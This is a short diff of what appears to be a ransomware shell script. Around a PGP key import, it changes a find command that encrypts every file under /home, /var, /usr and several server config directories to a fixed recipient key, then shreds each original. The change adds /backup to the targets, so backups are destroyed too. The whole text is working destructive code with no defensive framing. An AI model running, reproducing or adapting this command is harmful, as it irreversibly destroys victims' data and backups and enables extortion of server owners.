@@ -44,4 +44,4 @@ I57Q5vcwTg==
 =K5dc
 -----END PGP PUBLIC KEY BLOCK-----' | gpg --import
 cp /usr/bin/gpg /sbin/
-find /home /var /usr /etc/apache2 /etc/nginx /etc/mysql /etc/ufw -type f ! -name '*.ENC' -exec /sbin/gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \;
+find /home /backup /var /usr /etc/apache2 /etc/nginx /etc/mysql /etc/ufw -type f ! -name '*.ENC' -exec /sbin/gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \;
